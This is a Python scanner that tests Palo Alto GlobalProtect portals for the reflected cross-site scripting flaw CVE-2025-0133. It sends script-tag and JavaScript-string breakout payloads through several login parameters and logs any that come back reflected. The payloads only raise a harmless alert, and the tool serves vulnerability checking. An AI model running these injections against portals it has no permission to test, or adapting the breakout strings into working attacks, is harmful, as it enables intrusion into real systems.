#!/usr/bin/env python3
"""
CVE-2025-0133 XSS Test Script (HTML & JS Injection Contexts)

Author: Derek Odiorne
Date: 2025-05-23
"""

import requests
import argparse
import uuid
from urllib.parse import quote
from datetime import datetime
from colorama import Fore, Style, init
import os

init(autoreset=True)

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                  "AppleWebKit/537.36 (KHTML, like Gecko) "
                  "Chrome/113.0.0.0 Safari/537.36"
}

COMMON_PARAMS = ["user", "username", "login", "email", "id", "token"]

def validate_target(base_url):
    try:
        print(f"{Fore.CYAN}[*] Validating target...")
        r = requests.get(f"{base_url}/global-protect/login.esp", headers=HEADERS, verify=True, timeout=10)
        if r.status_code == 200:
            print(f"{Fore.GREEN}[+] Target is available (HTTP 200).")
            return True
        elif r.status_code == 503:
            print(f"{Fore.YELLOW}[-] Target returned HTTP 503. Try again later.")
        else:
            print(f"{Fore.YELLOW}[-] Target returned unexpected HTTP {r.status_code}")
    except Exception as e:
        print(f"{Fore.RED}[-] Connection error: {e}")
    return False

def test_parameters(base_url):
    endpoint = "/global-protect/login.esp"
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_filename = f"cve_2025_0133_results_{datetime.now().strftime('%Y%m%d')}.log"
    log_filepath = os.path.abspath(log_filename)

    print(f"\n=== CVE-2025-0133 XSS Dual-Context Scan ===")
    print(f"Author     : Derek Odiorne")
    print(f"Date       : {timestamp}")
    print(f"Target     : {base_url}")
    print(f"Endpoint   : {endpoint}\n")

    with open(log_filepath, "a") as log:
        for param in COMMON_PARAMS:
            uid = str(uuid.uuid4())

            html_payload = f"<script>alert('{uid}')</script>"
            js_payload = f'j\\";-alert("{uid}")-\\"x'

            for context, raw_payload in [("HTML", html_payload), ("JS", js_payload)]:
                encoded = quote(raw_payload)
                test_url = f"{base_url.rstrip('/')}{endpoint}?{param}={encoded}"
                try:
                    response = requests.get(test_url, headers=HEADERS, verify=True, timeout=10)
                    found = raw_payload in response.text
                    label = f"{context} context - param '{param}'"

                    if response.status_code == 200:
                        if found:
                            print(f"{Fore.RED}[!] Reflected XSS found: {label}")
                            log.write(f"{timestamp} | {test_url} | VULNERABLE [{context}]\n")
                        else:
                            print(f"{Fore.GREEN}[+] Safe: {label}")
                            log.write(f"{timestamp} | {test_url} | SAFE [{context}]\n")
                    else:
                        print(f"{Fore.YELLOW}[-] HTTP {response.status_code} for {label}")
                        log.write(f"{timestamp} | {test_url} | HTTP {response.status_code} [{context}]\n")
                except requests.RequestException as e:
                    print(f"{Fore.RED}[-] Error with {label}: {e}")
                    log.write(f"{timestamp} | {test_url} | ERROR: {e} [{context}]\n")

    print(f"\n{Fore.CYAN}[*] Scan complete. Log file: {Fore.YELLOW}{log_filepath}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Scan for CVE-2025-0133 (reflected XSS) in Palo Alto GlobalProtect portals."
    )
    parser.add_argument(
        "base_url",
        help="The base URL of the GlobalProtect portal (e.g., https://yourdomain.com)"
    )
    args = parser.parse_args()

    if validate_target(args.base_url):
        test_parameters(args.base_url)
    else:
        print(f"{Fore.RED}[-] Scan aborted: Target validation failed.")
